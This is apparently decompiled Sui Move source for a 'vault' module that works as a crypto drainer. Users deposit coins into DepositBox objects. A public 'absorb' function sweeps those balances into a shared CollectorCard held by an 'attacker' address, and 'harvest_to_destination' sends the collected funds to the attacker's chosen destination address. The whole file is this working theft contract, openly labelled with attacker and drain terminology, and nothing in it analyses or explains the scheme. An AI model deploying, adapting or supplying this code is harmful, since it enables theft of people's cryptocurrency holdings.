module 0xb8b6956fb73ce8f433b00a7126fcbc1a07fc7394a7e6841e487bda454c5e64c9::vault {
    struct DepositBox has store, key {
        id: 0x2::object::UID,
        label: vector<u8>,
        deposit_count: u64,
    }

    struct CollectorCard has key {
        id: 0x2::object::UID,
        attacker: address,
        accepted_types: vector<0x1::type_name::TypeName>,
        total_drains: u64,
    }

    struct AttackerConfig has store, key {
        id: 0x2::object::UID,
        final_destination: address,
    }

    struct CoinBalanceKey<phantom T0> has copy, drop, store {
        dummy_field: bool,
    }

    public fun absorb<T0>(arg0: &mut CollectorCard, arg1: &mut DepositBox) {
        let v0 = 0x1::type_name::get<T0>();
        assert!(0x1::vector::contains<0x1::type_name::TypeName>(&arg0.accepted_types, &v0), 3);
        let v1 = CoinBalanceKey<T0>{dummy_field: false};
        assert!(0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg1.id, v1), 1);
        if (0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v1)) {
            0x2::balance::join<T0>(0x2::dynamic_field::borrow_mut<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v1), 0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg1.id, v1));
        } else {
            0x2::dynamic_field::add<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v1, 0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg1.id, v1));
        };
        arg0.total_drains = arg0.total_drains + 1;
    }

    public entry fun add_accepted_type<T0>(arg0: &mut CollectorCard, arg1: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg1) == arg0.attacker, 2);
        let v0 = 0x1::type_name::get<T0>();
        assert!(!0x1::vector::contains<0x1::type_name::TypeName>(&arg0.accepted_types, &v0), 4);
        0x1::vector::push_back<0x1::type_name::TypeName>(&mut arg0.accepted_types, v0);
    }

    public fun create_box_returning(arg0: vector<u8>, arg1: &mut 0x2::tx_context::TxContext) : DepositBox {
        DepositBox{
            id            : 0x2::object::new(arg1),
            label         : arg0,
            deposit_count : 0,
        }
    }

    public entry fun create_deposit_box(arg0: vector<u8>, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = create_box_returning(arg0, arg1);
        0x2::transfer::public_transfer<DepositBox>(v0, 0x2::tx_context::sender(arg1));
    }

    public fun finalize_box_to_sender(arg0: DepositBox, arg1: &0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<DepositBox>(arg0, 0x2::tx_context::sender(arg1));
    }

    public entry fun harvest_to_destination<T0>(arg0: &mut CollectorCard, arg1: &AttackerConfig, arg2: &mut 0x2::tx_context::TxContext) {
        assert!(0x2::tx_context::sender(arg2) == arg0.attacker, 2);
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        assert!(0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0), 1);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(0x2::dynamic_field::remove<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0), arg2), arg1.final_destination);
    }

    public fun is_accepted<T0>(arg0: &CollectorCard) : bool {
        let v0 = 0x1::type_name::get<T0>();
        0x1::vector::contains<0x1::type_name::TypeName>(&arg0.accepted_types, &v0)
    }

    public entry fun setup_attacker(arg0: vector<u8>, arg1: address, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = CollectorCard{
            id             : 0x2::object::new(arg2),
            attacker       : 0x2::tx_context::sender(arg2),
            accepted_types : 0x1::vector::empty<0x1::type_name::TypeName>(),
            total_drains   : 0,
        };
        let v1 = AttackerConfig{
            id                : 0x2::object::new(arg2),
            final_destination : arg1,
        };
        0x2::transfer::share_object<CollectorCard>(v0);
        0x2::transfer::public_transfer<AttackerConfig>(v1, 0x2::tx_context::sender(arg2));
    }

    public fun stash<T0>(arg0: &mut DepositBox, arg1: 0x2::coin::Coin<T0>) {
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        if (0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0)) {
            0x2::balance::join<T0>(0x2::dynamic_field::borrow_mut<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0), 0x2::coin::into_balance<T0>(arg1));
        } else {
            0x2::dynamic_field::add<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&mut arg0.id, v0, 0x2::coin::into_balance<T0>(arg1));
        };
        arg0.deposit_count = arg0.deposit_count + 1;
    }

    public fun stored_amount<T0>(arg0: &CollectorCard) : u64 {
        let v0 = CoinBalanceKey<T0>{dummy_field: false};
        if (!0x2::dynamic_field::exists_with_type<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0)) {
            return 0
        };
        0x2::balance::value<T0>(0x2::dynamic_field::borrow<CoinBalanceKey<T0>, 0x2::balance::Balance<T0>>(&arg0.id, v0))
    }

    // decompiled from Move bytecode v7
}

